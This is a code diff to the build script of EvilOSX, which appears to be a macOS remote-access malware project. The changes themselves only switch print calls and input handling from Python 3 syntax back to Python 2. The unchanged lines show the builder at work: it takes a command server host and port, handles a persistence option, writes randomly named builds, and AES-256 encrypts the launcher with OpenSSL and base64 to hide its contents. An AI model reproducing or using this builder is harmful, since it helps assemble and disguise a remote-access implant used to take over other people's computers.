@@ -4,8 +4,6 @@
 __author__ = "Marten4n6"
 __license__ = "GPLv3"
 
-from __future__ import print_function
-
 import os
 import random
 import string
@@ -14,11 +12,6 @@ from sys import exit
 MESSAGE_INPUT = "\033[1m" + "[?] " + "\033[0m"
 MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
 MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"
-
-try:
-    raw_input          # Python 2
-except NameError:
-    raw_input = input  # Python 3
 
 
 def random_string(size, numbers=False):
@@ -56,7 +49,7 @@ def main():
     build_output = os.path.dirname(os.path.realpath(__file__)) + "/builds/EvilOSX-" + random_string(8) + ".py"
 
     if not os.path.exists(build_input):
-        print(MESSAGE_ATTENTION + "Failed to find EvilOSX.py in current directory.")
+        print MESSAGE_ATTENTION + "Failed to find EvilOSX.py in current directory."
         exit(0)
     if not os.path.exists("builds"):
         os.mkdir("builds")
@@ -75,13 +68,13 @@ def main():
             disable_persistence = True
 
         if server_host.strip() == "":
-            print(MESSAGE_ATTENTION + "Invalid server host.")
+            print MESSAGE_ATTENTION + "Invalid server host."
             exit(0)
         elif server_port == "":
-            print(MESSAGE_ATTENTION + "Invalid server port.")
+            print MESSAGE_ATTENTION + "Invalid server port."
             exit(0)
 
-        print(MESSAGE_INFO + "Configuring EvilOSX...")
+        print MESSAGE_INFO + "Configuring EvilOSX..."
 
         # Set variables
         with open(build_input, "r") as input_file, open(build_output, "w+") as output_file:
@@ -103,15 +96,15 @@ def main():
                 else:
                     output_file.write(line)
 
-        print(MESSAGE_INFO + "Encrypting with AES 256 (using system OpenSSL)...")
+        print MESSAGE_INFO + "Encrypting with AES 256 (using system OpenSSL)..."
 
         # AES 256 encrypt the launcher
         with open("builds/tmp_file.py", "w+") as output_file:
             salt, key, iv = get_aes_key()
 
-            print("[DEBUG] Salt: " + salt)
-            print("[DEBUG] Key: " + key)
-            print("[DEBUG] IV: " + iv)
+            print "[DEBUG] Salt: " + salt
+            print "[DEBUG] Key: " + key
+            print "[DEBUG] IV: " + iv
 
             encrypt_command = "cat %s | base64 | openssl aes-256-cbc -e -a -k %s -iv %s -S %s -md sha256" % (
                 build_output, key, iv, salt
@@ -129,14 +122,14 @@ def main():
             # Replace the unencrypted file with the final encrypted version.
             os.rename("builds/tmp_file.py", build_output)
 
-        print(MESSAGE_INFO + "Done! Built file located at: %s" % os.path.realpath(build_output))
+        print MESSAGE_INFO + "Done! Built file located at: %s" % os.path.realpath(build_output)
     except ValueError:
-        print(MESSAGE_ATTENTION + "Invalid server port.")
+        print MESSAGE_ATTENTION + "Invalid server port."
 
 
 if __name__ == '__main__':
     try:
         main()
     except KeyboardInterrupt:
-        print("\n" + MESSAGE_INFO + "Interrupted.")
+        print "\n" + MESSAGE_INFO + "Interrupted."
         exit(0)
